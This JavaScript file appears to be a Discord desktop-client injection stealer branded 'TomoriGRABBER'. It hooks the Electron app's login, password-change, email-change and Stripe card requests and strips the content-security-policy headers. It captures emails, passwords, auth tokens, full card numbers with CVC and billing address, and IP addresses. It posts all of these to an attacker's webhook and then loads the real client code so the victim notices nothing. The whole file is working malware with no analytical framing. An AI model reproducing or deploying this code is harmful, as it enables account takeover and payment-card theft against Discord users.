const fs = require('fs');
const {
    BrowserWindow,
    session
} = require('electron')
const querystring = require('querystring');

var webhook = "%WEBHOOK%";

function firstRun() {
    fs.readdir(__dirname, (err, data) => {
        if (data.includes("Tomori.txt")) return true
        else {
            fs.writeFile(`${__dirname}/Tomori.txt`, "i", err => {
                if (err) {}
            })
            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`var t=webpackJsonp.push([[],{extra_id:(t,n,e)=>t.exports=e},[["extra_id"]]]);(function(n){const e="string"==typeof n?n:null;for(const o in t.c)if(t.c.hasOwnProperty(o)){const r=t.c[o].exports;if(r&&r.__esModule&&r.default&&(e?r.default[e]:n(r.default)))return r.default;if(r&&(e?r[e]:n(r)))return r}return null})("login").logout()`, true); return false
        }
    })
}
const discordAPI = {
        "urls": [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "https://*.discord.com/api/v*/users/@me/billing/subscriptions",
            "https://discord.com/api/v*/users/@me/billing/subscriptions",
            "wss://remote-auth-gateway.discord.gg/*"
        ]
    },
    passwordInfo = {
        urls: [
            "https://discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/users/@me",
            "https://*.discord.com/api/v*/users/@me",
            "https://discordapp.com/api/v*/auth/login",
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            "https://api.stripe.com/v*/tokens"
        ]
    };


session.defaultSession.webRequest.onBeforeRequest(discordAPI, (DATA, callback) => {
    if (firstRun())
        if (DATA.url.startsWith("wss://")) callback({ cancel: true })
    else callback({ cancel: false })
})

session.defaultSession.webRequest.onHeadersReceived((DATA, callback) => {
    delete DATA.responseHeaders['content-security-policy'];
    delete DATA.responseHeaders['content-security-policy-report-only'];
    callback({ responseHeaders: { ...DATA.responseHeaders, 'Access-Control-Allow-Headers': "*" }
    })
})
session.defaultSession.webRequest.onCompleted(passwordInfo, (DATA, callback) => {
    if (DATA.url.endsWith("login")) {
        if (DATA.statusCode == 200) {
            const data = JSON.parse(Buffer.from(DATA.uploadData[0].bytes).toString())
            const email = data.login;
            const password = data.password;

            const window = BrowserWindow.getAllWindows()[0];
            window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then(token => Login(email, password, token));
        }
    }
    if (DATA.url.endsWith("users/@me")) {
        if (DATA.statusCode == 200 && DATA.method == "PATCH") {
            const data = JSON.parse(Buffer.from(DATA.uploadData[0].bytes).toString())
            if (data.password != null && data.password != undefined && data.password != "") {
                if (data.new_password != undefined && data.new_password != null && data.new_password != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then(token => newPassword(data.password, data.new_password, token));
                }
                if (data.email != null && data.email != undefined && data.email != "") {
                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then(token => newEmail(data.email, data.password, token))
                }
            }
        }
    }
    if (DATA.url.endsWith("tokens")) {
        const window = BrowserWindow.getAllWindows()[0];
        const item = querystring.parse(decodeURIComponent(Buffer.from(DATA.uploadData[0].bytes).toString()))
        window.webContents.executeJavaScript(`var req=webpackJsonp.push([[],{extra_id:(e,t,r)=>e.exports=r},[["extra_id"]]]);for(let e in req.c)if(req.c.hasOwnProperty(e)){let t=req.c[e].exports;if(t&&t.__esModule&&t.default)for(let e in t.default)"getToken"===e&&(token=t.default.getToken())} token`, true).then(token => newCard(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], item["card[address_line1]"], item["card[address_city]"], item["card[address_state]"], item["card[address_zip]"], item["card[address_country]"], token));
    }
});

function sendWeb(send) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open("POST", "${webhook}", true);
    XML.setRequestHeader('Content-Type', 'application/json');
    XML.setRequestHeader('Access-Control-Allow-Origin', '*');
    XML.send(JSON.stringify(${send}));`, true)
}

function NitroSub(flags) {
    if (flags == 0) return "𝗡𝗼 𝗡𝗶𝘁𝗿𝗼";
    if (flags == 1) return "𝐍𝐢𝐭𝐫𝐨 𝐂𝐥𝐚𝐬𝐬𝐢𝐜";
    if (flags == 2) return "𝐍𝐢𝐭𝐫𝐨 𝐁𝐨𝐨𝐬𝐭";
    else return "𝗡𝗼 𝗡𝗶𝘁𝗿𝗼";
}

function BADGES(flags) {
    var badges = "";
    if ((flags & 1) == 1) badges += "𝐒𝐭𝐚𝐟𝐟,";
    if ((flags & 2) == 2) badges += "𝐏𝐚𝐫𝐭𝐧𝐞𝐫,";
    if ((flags & 4) == 4) badges += "𝐇𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 𝐄𝐯𝐞𝐧𝐭,"
    if ((flags & 8) == 8) badges += "𝐆𝐫𝐞𝐞𝐧 𝐁𝐮𝐠𝐡𝐮𝐧𝐭𝐞𝐫,";
    if ((flags & 64) == 64) badges += "𝐇𝐲𝐩𝐞𝐬𝐪𝐮𝐚𝐝 𝐁𝐫𝐚𝐯𝐞𝐫𝐲,";
    if ((flags & 128) == 128) badges += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐫𝐢𝐥𝐥𝐚𝐧𝐜𝐞,";
    if ((flags & 256) == 256) badges += "𝐇𝐲𝐩𝐞𝐒𝐪𝐮𝐚𝐝 𝐁𝐚𝐥𝐚𝐧𝐜𝐞,";
    if ((flags & 512) == 512) badges += "𝐄𝐚𝐫𝐥𝐲 𝐒𝐮𝐩𝐩𝐨𝐫𝐭𝐞𝐫,";
    if ((flags & 16384) == 16384) badges += "𝐆𝐨𝐥𝐝 𝐁𝐮𝐠𝐇𝐮𝐧𝐭𝐞𝐫,";
    if ((flags & 131072) == 131072) badges += "𝐃𝐢𝐬𝐜𝐨𝐫𝐝 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫,";
    if (badges == "") badges = "𝐍𝐨 𝐁𝐚𝐝𝐠𝐞𝐬"
    return badges;

}

function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then(info => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText;`, true).then(cb => {
            window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://ipapi.co/json", false );
        XML.send( null );
        XML.responseText;
    `, true).then(ip => {
                window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discordapp.com/api/v9/users/@me/relationships", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then(r => {
                    const friends = JSON.parse(r)
                    const json = JSON.parse(info);
                    const IP = JSON.parse(ip)
                    const CB = JSON.parse(cb)
                    if (CB[0].id !== undefined) var e = "True"
                    else var e = "False"
                    var embed = {
                        username: "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                        content: "",
                        embeds: [{
                            "title": "𝐍𝐞𝐰 𝐏𝐞𝐫𝐬𝐨𝐧 𝐆𝐫𝐚𝐛𝐛𝐞𝐝",
                            "description": "",
                            "fields": [{
                                "name": "𝐔𝐬𝐞𝐫𝐍𝐚𝐦𝐞:",
                                "value": "```" + `${json.username}#${json.discriminator}` + "```",
                            }, {
                                "name": "𝐈𝐃: ",
                                "value": "```" + `${json.id}` + "```",
                            }, {
                                "name": "𝐍𝐢𝐭𝐫𝐨 𝐓𝐲𝐩𝐞: ",
                                "value": "```" + NitroSub(json.premium_type) + "```",
                            }, {
                                "name": "𝐁𝐚𝐝𝐠𝐞𝐬: ",
                                "value": "```" + BADGES(json.flags) + "```"
                            }, {
                                "name": "𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐂𝐎𝐔𝐍𝐓: ",
                                "value": "```" + friends.length + "```"
                            }, {
                                "name": "𝗕𝗜𝗟𝗟𝗜𝗡𝗚 𝗜𝗡𝗙𝗢𝗦 ?: ",
                                "value": "```" + e + "```"
                            }, {
                                "name": "𝐄𝐌𝐀𝐈𝐋: ",
                                "value": "```" + `${email}` + "```",
                            }, {
                                "name": "𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ",
                                "value": "```" + password + "```"
                            }, {
                                "name": "𝐓𝐎𝐊𝐄𝐍: ",
                                "value": "```" + token + "```"
                            }, {
                                "name": "𝐈𝐏: ",
                                "value": "```" + IP.ip + "```"
                            }],
                            "author": {
                                "name": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                                "icon_url": "https://thumbs.gfycat.com/SpryLeanImpala-size_restricted.gif"
                            },
                            "footer": {
                                "text": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                                "icon_url": "https://thumbs.gfycat.com/SpryLeanImpala-size_restricted.gif"
                            },
                            "thumbnail": {
                                "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.gif?size=128`
                            },
                            "image": {
                                "url": `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.gif?size=512`
                            },
                            "color": 43690,
                        }]
                    }
                    sendWeb(JSON.stringify(embed));
                })
            })
        })
    })
}


function newPassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then(info => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText;`, true).then(cb => {
            window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://ipapi.co/json", false );
        XML.send( null );
        XML.responseText;
    `, true).then(ip => {
                window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discordapp.com/api/v9/users/@me/relationships", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then(r => {
                    const friends = JSON.parse(r)
                    const json = JSON.parse(info);
                    const IP = JSON.parse(ip)
                    const CB = JSON.parse(cb)
                    if (CB[0].id !== undefined) var e = "True"
                    else var e = "False"
                    var embed = {
                        username: "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                        content: "",
                        embeds: [{
                            "title": "𝗔 𝗣𝗲𝗿𝘀𝗼𝗻 𝗖𝗵𝗮𝗻𝗴𝗲𝗱 𝗛𝗶𝘀 𝗣𝗮𝘀𝘀𝗪𝗼𝗿𝗱",
                            "description": "",
                            "fields": [{
                                "name": "𝐔𝐬𝐞𝐫𝐍𝐚𝐦𝐞:",
                                "value": "```" + `${json.username}#${json.discriminator}` + "```",
                            }, {
                                "name": "𝐈𝐃: ",
                                "value": "```" + `${json.id}` + "```",
                            }, {
                                "name": "𝐍𝐢𝐭𝐫𝐨 𝐓𝐲𝐩𝐞: ",
                                "value": "```" + NitroSub(json.premium_type) + "```",
                            }, {
                                "name": "𝐁𝐚𝐝𝐠𝐞𝐬: ",
                                "value": "```" + BADGES(json.flags) + "```"
                            }, {
                                "name": "𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐂𝐎𝐔𝐍𝐓: ",
                                "value": "```" + friends.length + "```"
                            }, {
                                "name": "𝗕𝗜𝗟𝗟𝗜𝗡𝗚 𝗜𝗡𝗙𝗢𝗦 ?: ",
                                "value": "```" + e + "```"
                            }, {
                                "name": "𝗘𝗠𝗔𝗜𝗟:",
                                "value": "```" + json.email + "```"
                            }, {
                                "name": "𝗢𝗟𝗗 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ",
                                "value": "```" + `${oldpassword}` + "```",
                            }, {
                                "name": "𝗡𝗘𝗪 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ",
                                "value": "```" + newpassword + "```"
                            }, {
                                "name": "𝐓𝐎𝐊𝐄𝐍: ",
                                "value": "```" + token + "```"
                            }, {
                                "name": "𝐈𝐏: ",
                                "value": "```" + IP.ip + "```"
                            }],
                            "author": {
                                "name": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                                "icon_url": "https://thumbs.gfycat.com/SpryLeanImpala-size_restricted.gif"
                            },
                            "footer": {
                                "text": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                                "icon_url": "https://thumbs.gfycat.com/SpryLeanImpala-size_restricted.gif"
                            },
                            "thumbnail": {
                                "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.gif?size=128`
                            },
                            "image": {
                                "url": `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.gif?size=512`
                            },
                            "color": 43690,
                        }]
                    }
                    sendWeb(JSON.stringify(embed));
                })
            })
        })
    })
}

function newEmail(newemail, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then(info => {
        window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discordapp.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText;`, true).then(cb => {
            window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://ipapi.co/json", false );
        XML.send( null );
        XML.responseText;
    `, true).then(ip => {
                window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discordapp.com/api/v9/users/@me/relationships", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then(r => {
                    const friends = JSON.parse(r)
                    const json = JSON.parse(info);
                    const IP = JSON.parse(ip)
                    const CB = JSON.parse(cb)
                    if (CB[0].id !== undefined) var e = "True"
                    else var e = "False"
                    var embed = {
                        username: "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                        content: "",
                        embeds: [{
                            "title": "𝗔 𝗣𝗲𝗿𝘀𝗼𝗻 𝗖𝗵𝗮𝗻𝗴𝗲𝗱 𝗛𝗶𝘀 𝗘𝗠𝗔𝗜𝗟",
                            "description": "",
                            "fields": [{
                                "name": "𝐔𝐬𝐞𝐫𝐍𝐚𝐦𝐞:",
                                "value": "```" + `${json.username}#${json.discriminator}` + "```",
                            }, {
                                "name": "𝐈𝐃: ",
                                "value": "```" + `${json.id}` + "```",
                            }, {
                                "name": "𝐍𝐢𝐭𝐫𝐨 𝐓𝐲𝐩𝐞: ",
                                "value": "```" + NitroSub(json.premium_type) + "```",
                            }, {
                                "name": "𝐁𝐚𝐝𝐠𝐞𝐬: ",
                                "value": "```" + BADGES(json.flags) + "```"
                            }, {
                                "name": "𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐂𝐎𝐔𝐍𝐓: ",
                                "value": "```" + friends.length + "```"
                            }, {
                                "name": "𝗕𝗜𝗟𝗟𝗜𝗡𝗚 𝗜𝗡𝗙𝗢𝗦 ?: ",
                                "value": "```" + e + "```"
                            }, {
                                "name": "𝗡𝗘𝗪 𝐄𝐌𝐀𝐈𝐋: ",
                                "value": "```" + `${newemail}` + "```",
                            }, {
                                "name": "𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃: ",
                                "value": "```" + password + "```"
                            }, {
                                "name": "𝐓𝐎𝐊𝐄𝐍: ",
                                "value": "```" + token + "```"
                            }, {
                                "name": "𝐈𝐏: ",
                                "value": "```" + IP.ip + "```"
                            }],
                            "author": {
                                "name": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                                "icon_url": "https://thumbs.gfycat.com/SpryLeanImpala-size_restricted.gif"
                            },
                            "footer": {
                                "text": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                                "icon_url": "https://thumbs.gfycat.com/SpryLeanImpala-size_restricted.gif"
                            },
                            "thumbnail": {
                                "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.gif?size=128`
                            },
                            "image": {
                                "url": `https://cdn.discordapp.com/banners/${json.id}/${json.banner}.gif?size=512`
                            },
                            "color": 43690,
                        }]
                    }
                    sendWeb(JSON.stringify(embed));
                })
            })
        })
    })

}


function newCard(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) {

    const window = BrowserWindow.getAllWindows()[0];

    window.webContents.executeJavaScript(`
    var XML = new XMLHttpRequest();
    XML.open( "GET", "https://discord.com/api/v8/users/@me", false );
    XML.setRequestHeader("Authorization", "${token}");
    XML.send( null );
    XML.responseText;`, true).then(info => {
        window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://www.myexternalip.com/raw", false );
        XML.send( null );
        XML.responseText;
    `, true).then(ip => {
            window.webContents.executeJavaScript(`
        var XML = new XMLHttpRequest();
        XML.open( "GET", "https://discordapp.com/api/v9/users/@me/relationships", false );
        XML.setRequestHeader("Authorization", "${token}");
        XML.send( null );
        XML.responseText;`, true).then(r => {
                var json = JSON.parse(info);
                const friends = JSON.parse(r)
                var embed = {
                    username: "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑",
                    content: "",
                    embeds: [{
                        "title": "𝗦𝗼𝗺𝗲𝗼𝗻𝗲 𝗔𝗱𝗱𝗲𝗱 𝗔 𝗖𝗿𝗲𝗱𝗶𝘁 𝗖𝗮𝗿𝗱",
                        "description": "",
                        "fields": [{
                            "name": "𝐔𝐬𝐞𝐫𝐍𝐚𝐦𝐞:",
                            "value": "```" + `${json.username}#${json.discriminator}` + "```",
                        }, {
                            "name": "𝐈𝐃: ",
                            "value": "```" + `${json.id}` + "```",
                        }, {
                            "name": "𝐍𝐢𝐭𝐫𝐨 𝐓𝐲𝐩𝐞: ",
                            "value": "```" + NitroSub(json.premium_type) + "```",
                        }, {
                            "name": "𝐁𝐚𝐝𝐠𝐞𝐬: ",
                            "value": "```" + BADGES(json.flags) + "```"
                        }, {
                            "name": "𝐅𝐑𝐈𝐄𝐍𝐃𝐒 𝐂𝐎𝐔𝐍𝐓: ",
                            "value": "```" + friends.length + "```"
                        }, {
                            "name": "𝗖𝗔𝗥𝗗 𝗡𝗨𝗠𝗕𝗘𝗥:",
                            "value": "```" + number + "```"
                        }, {
                            "name": "𝗘𝗫𝗣𝗜𝗥𝗔𝗧𝗜𝗢𝗡: ",
                            "value": "```" + `${expir_month}/${expir_year}` + "```",
                        }, {
                            "name": "𝗖𝗩𝗩: ",
                            "value": "```" + cvc + "```"
                        }, {
                            "name": "𝗖𝗼𝘂𝗻𝘁𝗿𝘆: : ",
                            "value": "```" + country + "```"
                        }, {
                            "name": "𝗦𝘁𝗮𝘁e: ",
                            "value": "```" + state + "```"
                        }, {
                            "name": "𝗖𝗶𝘁𝘆: ",
                            "value": "```" + city + "```"
                        }, {
                            "name": "𝗭𝗶𝗽𝗖𝗼𝗱𝗲: : ",
                            "value": "```" + zip + "```"
                        }, {
                            "name": "𝗦𝘁𝗿𝗲𝗲𝘁: ",
                            "value": "```" + street + "```"
                        }, {
                            "name": "𝐓𝐎𝐊𝐄𝐍: ",
                            "value": "```" + token + "```"
                        }, {
                            "name": "𝐈𝐏: ",
                            "value": "```" + ip + "```"
                        }],
                        "author": {
                            "name": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑"
                        },
                        "footer": {
                            "text": "𝐓𝐨𝐦𝐨𝐫𝐢𝐆𝐑𝐀𝐁𝐁𝐄𝐑"
                        },
                        "thumbnail": {
                            "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
                        },
                        "color": 43690
                    }]
                }
                sendWeb(JSON.stringify(embed));
            })
        })
    })
}
module.exports = require('./core.asar');
